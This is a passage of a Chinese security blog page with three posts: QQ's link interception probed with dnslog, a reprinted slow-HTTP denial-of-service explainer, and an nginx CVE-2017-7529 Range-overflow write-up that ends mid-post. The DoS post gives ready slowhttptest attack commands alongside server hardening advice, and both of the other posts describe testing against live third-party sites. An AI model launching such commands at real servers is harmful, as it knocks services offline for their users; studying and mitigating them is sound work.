<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>氕氘氚</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Open your eyes to see the light in life">
<meta property="og:type" content="website">
<meta property="og:title" content="氕氘氚">
<meta property="og:url" content="http://example.com/page/10/index.html">
<meta property="og:site_name" content="氕氘氚">
<meta property="og:description" content="Open your eyes to see the light in life">
<meta property="og:locale">
<meta property="article:author" content="Szczecin">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        





<section class="post-list">
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/09/Request-Response-QQ/">
                QQ 移动端访问控制策略小窥
            </a>
        </h2>
    
    <time>
        Aug 9, 2022
    </time>
    <section class="content">
        <h1><span id="qq-移动端访问控制策略小窥">QQ 移动端访问控制策略小窥</span></h1><h2><span id="起因">起因</span></h2><blockquote>
<p>今天在学习 SRC 发掘的时候，看到很多介绍文章其实在 Hackone 上就有应用例，然后看到一篇需要权限访问的文章，遂要求登录。</p>
<p>还没有个人账号，于是注册一下，到最后一步得到一个邮箱确认链接：</p>
<p><img src="/2022/08/09/Request-Response-QQ/1.jpg" alt="image"></p>
<p>由于是公司电脑，没有装额外通讯软件，遂在手机 click，果不其然被 QQ 拦截了<del>（这个做的真的不行）</del>：</p>
<p><img src="/2022/08/09/Request-Response-QQ/2.jpg" alt="image"></p>
<p>于是我把链接 copy 到 PC 上，重新访问，结果弹出该链接已经被使用了的页面，并且可以要求 Resend：</p>
<p><img src="/2022/08/09/Request-Response-QQ/3.jpg" alt="image"></p>
</blockquote>
<h2><span id="推测">推测</span></h2><blockquote>
<p>我顿了一下（柯南 BGM）：这个确认链接（token）已经被访问，只有可能是我刚才手机 click 了 button 导致的，也就是发送了请求（request），但是没有收到正确回应（response）。</p>
<p>即 TX 是帮你请求过一次链接的<del>（说好听点是帮你，说不好听就是劫持&#x3D; &#x3D;）</del>，他拦截的只是响应包。</p>
<ul>
<li>这样会有两个问题：</li>
</ul>
<ol>
<li>服务端是否是不分情况就去请求了这个链接的，如果换做是其他小公司的服务端这个策略应该是有问题的。</li>
<li>你是按照什么来判断网站不合规的？证书？白名单？响应包内容？<br>如果是证书，很多 http 链接就会被误报；如果是白名单，那么不需要放行请求（request）就可以判断并拦截；如果是响应（response）内容，为什么 Hackone 还是拦了？</li>
</ol>
<p><img src="/2022/08/09/Request-Response-QQ/1.gif" alt="image"></p>
</blockquote>
<h2><span id="验证">验证</span></h2><blockquote>
<p>在朋友（无中生友）的提醒下，发现可以用 dnslog 一试就能验证是否是进行了请求而拦截响应：</p>
<p><img src="/2022/08/09/Request-Response-QQ/4.jpg" alt="image"></p>
<p><img src="/2022/08/09/Request-Response-QQ/5.jpg" alt="image"></p>
<p><del>其实我都不用打码，反正一个是 TX 的 ip，一个是电信的移动 ip</del></p>
</blockquote>
<h2><span id="结语">结语</span></h2><blockquote>
<p>也就是小小发现而已，或许还火星了，记录一下<br>PS：微信现在还没有拦截限制好像，从那个上面倒是可以直接访问链接</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/Slow-HTTP-Dos/">
                Slow HTTP Dos
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="http慢速拒绝服务攻击slow-http-dos">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</span></h1><blockquote>
<p>本文摘自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/13409171.html">春告鳥</a>及<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/285282.html">libaisec</a></p>
</blockquote>
<h2><span id="http慢速拒绝服务攻击简介">HTTP慢速拒绝服务攻击简介</span></h2><blockquote>
<p>HTTP慢速攻击是利用HTTP合法机制，以极低的速度往服务器发送HTTP请求，尽量长时间保持连接，不释放，若是达到了Web Server对于并发连接数的上限，同时恶意占用的连接没有被释放，那么服务器端将无法接受新的请求，导致拒绝服务。</p>
</blockquote>
<h2><span id="http慢速攻击原理摘抄自倾旋师傅的博客httpspayloadsonlinearchivers2018-04-162">HTTP慢速攻击原理（摘抄自倾旋师傅的博客:</span></h2><blockquote>
<p>既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。</p>
<p>首先HTTP协议的报文都是一行一行的，类似于：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host : payloads.online\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Keep-Alive: <span class="number">900</span>\r\n</span><br><span class="line">Content-Length: <span class="number">100000000</span>\r\n</span><br><span class="line">Content_Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Accept: *.*\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<blockquote>
<p>那么报文中的\r\n是什么？</p>
<p>\r\n代表一行报文的结束也被称为空行（CRLF），而\r\n\r\n代表整个报文的结束</p>
<p>从上面贴出的GET请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。</p>
<p>通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求&#x2F;应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用Keep-Alive模式（又称持久连接、连接重用）时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。</p>
<p>那么当我们客户端发送一个报文，不以CRLF结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。</p>
<p>如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。</p>
<p>简单来说，就是我们每次只发一行，每次发送之间的间隔时间很长，这迟迟未发送结束的HTTP包会占用服务端的资源，当达到服务端处理请求的上限时，这时候再用户对网站正常请求，服务端也处理不了了，导致了拒绝服务。</p>
</blockquote>
<h2><span id="http慢速攻击分类">HTTP慢速攻击分类</span></h2><blockquote>
<p>HTTP慢速攻击分为三类：</p>
<ul>
<li>Slow headers</li>
<li>Slow body</li>
<li>Slow read</li>
</ul>
</blockquote>
<h3><span id="1slow-headers">1，Slow headers</span></h3><blockquote>
<p>第一类是最经典的HTTP Slow慢速攻击，由rsnake发明的，原理在上面已介绍。</p>
</blockquote>
<h3><span id="2slow-body">2，Slow body</span></h3><blockquote>
<p>第二类也叫做Slow HTTP POST</p>
<p>原理为在POST提交方式中，允许在HTTP的头中声明content-length，即POST内容的长度。</p>
<p>提交了恶意头之后，将需要传输的body缓慢进行发送，跟Slow headers类似，导致服务器端长时间等待需要传输的POST数据，当请求的数量变多后，达到了消耗服务器资源的效果，导致服务器宕机。</p>
</blockquote>
<h3><span id="3slow-read-attack">3，Slow Read attack</span></h3><blockquote>
<p>第三类攻击方式采用调整TCP协议中滑动窗口大小，来对服务器单次发送的数据大小进行控制，使得服务器需要对一个相应包分为很多个包来发送，想要使这种攻击效果明显，请求的资源要尽量大，这里很容易理解，当请求的资源越大，返回包才越大，这样才能分成更多的包让服务器发送，导致拒绝服务的产生。</p>
<p>也就是说，客户端以极低的速度来读取返回包，来消耗服务器的连接和内存资源。</p>
</blockquote>
<h2><span id="http慢速攻击实战">HTTP慢速攻击实战</span></h2><blockquote>
<p>一般使用slowhttptest工具（安装方式很多，不再赘述）</p>
</blockquote>
<h3><span id="工具简介">工具简介</span></h3><blockquote>
<p>SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试工具，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。</p>
<p>这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。</p>
</blockquote>
<h3><span id="使用参数介绍">使用参数介绍</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">测试模式:</span><br><span class="line">-H                            slow header,slowloris默认采用此模式          </span><br><span class="line">-B                            slow body</span><br><span class="line">-R                            远程攻击又名Apache killer</span><br><span class="line">-X                            slow <span class="built_in">read</span></span><br><span class="line">​</span><br><span class="line">报告选项：</span><br><span class="line">-g                            生成具有套接字状态更改的统计信息（默认关闭）</span><br><span class="line">-o file_prefix                将统计信息输出保存在file.html和file.csv中（需要-g）</span><br><span class="line">-v level                      日志信息，详细级别0-4：致命，信息，错误，警告，调试</span><br><span class="line">​</span><br><span class="line">常规选项：</span><br><span class="line">-c connections                连接目标连接数（50）</span><br><span class="line">-i seconds                    后续数据之间的间隔（以秒为单位）（10）</span><br><span class="line">-l seconds                    测试目标时间长度，以秒为单位（240）</span><br><span class="line">-r rate                       每秒连接数（50）</span><br><span class="line">-s                            如果需要，Content-Length标头的值（4096）</span><br><span class="line">-t                            在请求中使用的动词，对于slow header和response，默认为GET；对于slow body，默认为POST</span><br><span class="line">-u URL                        目标的绝对URL（http://localhost/）</span><br><span class="line">-x                            在slowloris and Slow POST tests模式中，指定发送的最大数据长度</span><br><span class="line">-f                            Content-Type标头的值（application/x-www-form-urlencoded）</span><br><span class="line">-m                            接受(Accept)标头的值（text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5）</span><br><span class="line">​</span><br><span class="line">探测/代理选项：</span><br><span class="line">-d host:port                  为所有连接指定代理</span><br><span class="line">-e host:port                  为探测连接指定代理</span><br><span class="line">-p seconds                    指定等待时间来确认DoS攻击已经成功</span><br><span class="line">​</span><br><span class="line">range attack特定选项：</span><br><span class="line">-a                            标头中的起始位置</span><br><span class="line">-b                            标头中的结束位置</span><br><span class="line">​</span><br><span class="line">slow <span class="built_in">read</span>特定选项：</span><br><span class="line">-k                            在连接中重复相同请求的次数。如果服务器支持永久连接，则用于成倍增加响应大小。</span><br><span class="line">-n                            从recv缓冲区读取操作之间的时间间隔，以秒为单位（1）</span><br><span class="line">-w                            slow <span class="built_in">read</span>模式中指定tcp窗口范围下限</span><br><span class="line">-y                            slow <span class="built_in">read</span>模式中指定tcp窗口范围上限</span><br><span class="line">-z                            在每次的<span class="built_in">read</span>中，从buffer中读取数据量</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于三种类型的慢速攻击，分别给出payload：（摘抄的！）</p>
</blockquote>
<h3><span id="slow-header">Slow Header</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://vulurl.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。</p>
</blockquote>
<h3><span id="slow-read">Slow Read</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://vulurl.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。</p>
</blockquote>
<h3><span id="slow-post">Slow Post</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://vulurl.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。</p>
<p>找一个存在漏洞的网址进行检测：</p>
<p>使用Slow Post的payload：（漏洞网址已高码）</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u https://xxxxxx</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2022/08/08/Slow-HTTP-Dos/1.png" alt="image"></p>
<p>当显示为NO，则表示存在HTTP慢速攻击漏洞，可导致拒绝服务。</p>
</blockquote>
<h2><span id="解决办法">解决办法</span></h2><blockquote>
<p>针对不同的Server其对慢速http拒绝服务攻击防范方法也不同：</p>
</blockquote>
<h3><span id="websphere">WebSphere</span></h3><blockquote>
<p>1、限制 HTTP 数据的大小</p>
<p>在WebSphere Application Server 中进行如下设置：</p>
<p>任何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。</p>
<p>HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。</p>
<p>另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。</p>
<p>设置限制任何请求正文的最大大小。</p>
</blockquote>
<blockquote>
<p>2、设置keepalive参数</p>
<p>打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。</p>
<p>这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。</p>
</blockquote>
<blockquote>
<p>详见<a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/cn/websphere/techjournal/1210_lansche/1210_lansche.html#new-step32">参考链接</a></p>
</blockquote>
<h3><span id="weblogic">Weblogic</span></h3><blockquote>
<p>1、在配置管理界面中的协议-&gt;一般信息下设置 完成消息超时时间小于200</p>
</blockquote>
<blockquote>
<p>2、在配置管理界面中的协议-&gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。</p>
</blockquote>
<blockquote>
<p>详见<a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/E12890_01/ales/docs32/integrateappenviron/configWLS.html#wp1101063">参考链接</a></p>
</blockquote>
<h3><span id="nginx">Nginx</span></h3><blockquote>
<p>1、通过调整$request_method，配置服务器接受http包的操作限制；</p>
</blockquote>
<blockquote>
<p>2、在保证业务不受影响的前提下，调整</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client_max_body_size</span><br><span class="line">client_body_buffer_size</span><br><span class="line">client_header_buffer_size</span><br><span class="line">large_client_header_buffersclient_body_timeout</span><br><span class="line">client_header_timeout</span><br></pre></td></tr></table></figure>

<blockquote>
<p>的值，必要时可以适当的增加；</p>
</blockquote>
<blockquote>
<p>3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；</p>
</blockquote>
<blockquote>
<p>4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients &#x3D; worker_processes * worker_connections。</p>
</blockquote>
<h3><span id="apache">Apache</span></h3><blockquote>
<p>建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。</p>
</blockquote>
<blockquote>
<p>1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout header=10-40,minrate=500</span><br><span class="line"></span><br><span class="line"><span class="comment">#请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout body=10-40,minrate=500</span><br></pre></td></tr></table></figure>

<blockquote>
<p>需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。<br>示例：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule reqtimeout_module modules/mod_reqtimeout.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">reqtimeout_module</span>&gt;</span></span><br><span class="line">        RequestReadTimeout header=10-40,minrate=500 body=10-40,minrate=500</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>2、mod_qos用于控制并发连接数。配置例如：</p>
<p>当服务器并发连接数超过600时，关闭keepalive<br><code>QS_SrvMaxConnClose 600</code></p>
<p>限制每个源IP最大并发连接数为50<br><code>QS_SrvMaxConnPerIP 50</code><br>这两个数值可以根据服务器的性能调整。</p>
</blockquote>
<blockquote>
<p>更多关于qos_module配置<a target="_blank" rel="noopener" href="http://mod-qos.sourceforge.net/dos.html">参考</a><br>示例：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule qos_module modules/mod_qos.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">qos_module</span>&gt;</span></span><br><span class="line">QS_SrvMaxConnClose 600</span><br><span class="line">QS_SrvMaxConnPerIP 50</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="ihs服务器">IHS服务器</span></h3><blockquote>
<p>请您先安装最新补丁包，然后启用mod_reqtimeout模块，在配置文件中加入：<br><code>LoadModule reqtimeout_module modules/mod_reqtimeout.so</code></p>
</blockquote>
<blockquote>
<p>为mod_reqtimeout模块添加配置：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_reqtimeout.c</span>&gt;</span></span><br><span class="line">RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于HTTPS站点，建议header&#x3D;20-40,MinRate&#x3D;500。</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21652165">参见</a></p>
</blockquote>
<h3><span id="f5负载均衡">F5负载均衡</span></h3><blockquote>
<p>F5负载均衡设备有相应的防护模块，如无购买可参考附件中的详细配置过程。<br>关于F5的慢速攻击防护配置，请参考<a target="_blank" rel="noopener" href="https://support.f5.com/kb/en-us/solutions/public/10000/200/sol10260.html">Page1</a>,<a target="_blank" rel="noopener" href="https://devcentral.f5.com/articles/mitigating-slow-http-post-ddos-attacks-with-irules-ndash-follow-up">Page2</a></p>
</blockquote>
<h3><span id="iis服务器">IIS服务器</span></h3><blockquote>
<p>IIS可配置相关网站的Web.config如下：</p>
</blockquote>
<blockquote>
<p>1、WebLimits设置：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">webLimits</span> <span class="attr">connectionTimeout</span>=<span class="string">&quot;00:00:30&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">headerWaitTimeout</span>=<span class="string">&quot;00:00:10&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">dynamicIdleThreshold</span>=<span class="string">&quot;150&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">minBytesPerSecond</span>=<span class="string">&quot;512&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考以下<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/weblimits#configuration">链接</a></p>
</blockquote>
<blockquote>
<p>2、headerLimits设置：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">add</span> <span class="attr">header</span>=<span class="string">&quot;Content-type&quot;</span> <span class="attr">sizeLimit</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/requestfiltering/requestlimits/headerlimits/">参考</a></p>
</blockquote>
<h2><span id="参考链接">参考链接：</span></h2><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2018-04-16/2">https://payloads.online/archivers/2018-04-16/2</a></li>
<li><a target="_blank" rel="noopener" href="https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoliu66007/p/10174672.html">https://www.cnblogs.com/xiaoliu66007/p/10174672.html</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/zh/thread-293945.html">https://forum.huawei.com/enterprise/zh/thread-293945.html</a></li>
</ul>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/CVE-2017-7529-Nginx/">
                CVE-2017-7529-Nginx
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="nginx-整数溢出小结-cve-2017-7529">nginx 整数溢出小结 cve-2017-7529</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/gaogaogaopipi/article/details/90301358">gaogaogaopipi</a></p>
</blockquote>
<h2><span id="起因">起因</span></h2><blockquote>
<p>这两天在做nginx整数溢出时出了点小岔子，经过学习对这个问题有了深入的了解，特此记录。</p>
<p>漏洞补丁以及平安银河实验室已经把这事说的很清楚了，在此记录<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/140402.html">原文地址</a></p>
<p>简单的说就是这么一回事：<br>HTTP的Range允许客户端分批次请求资源的一部分，如果服务端资源较大，可以通过Range来并发下载；<br>正常情况下组件代码中计算了Range的长度，防止溢出，可以构造恶意长度来绕过，从而读取缓存的头部数据，造成泄露。</p>
<p>细节要留意的就是range的相关定义，示例如下<br>Range:bytes&#x3D;0-1024 表示访问第0到第1024字节；<br>Range:bytes&#x3D;500-600,601-999，-300 表示分三块访问，分别是500到600字节，601到600字节，最后的300字节；</p>
<p>在Response头中设置:<br>Accept-Ranges:bytes 表示接受部分资源的请求；<br>Content-Range: bytes START-END&#x2F;SIZE 表示返回的资源位置；其中SIZE等于Content-Length;如：Content-Range: bytes 500-600&#x2F;1000</p>
</blockquote>
<h2><span id="经过">经过</span></h2><blockquote>
<p>测试站点：www.（我肯定是不能明说）.com.cn</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/1.png" alt="image"></p>
<p>以站点的一张图片为例子，路径：&#x2F;images&#x2F;sq.jpg</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/2.png" alt="image"></p>
<p>上图可以看到正常情况下content-length的大小是8935bytes，也就是size的大小。<br>size大小就是我一开始搞混了的地方，清楚了size的大小那么根据平安银河实验室的文章就有如下过程：</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/3.png" alt="image"></p>
<p>上图可以看到正常的返回数据以及完整的ranges长度返回。</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/4.png" alt="image"></p>
<p>上图可以看到，选择返回后十个bytes得到的结果（8935-10&#x3D;8925，所以是从8925开始返回。因为写定的end是总长减一，所以结尾的值是8934，所以此处statr&#x3D;8925,end&#x3D;8934），以及返回的range的位置。</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/5.png" alt="image"></p>
<p>上图是对上面的补充，可以看到在读取部分bytes时，完整的参数是从“多少”到“多少”，上面是从1到10</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/6.png" alt="image"></p>
<p>上图可以看到，在使用完整的输入模式，对-1开始读取的时候，触发了<code>ngx_http_range_parse()</code><br>对statr的负值检查，所以报错，无法读取。<br>那么此时就如原文所说<br>因此，如果需要将start解析为负数，只能通过-end这类后缀型range参数实现</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/7.png" alt="image"></p>
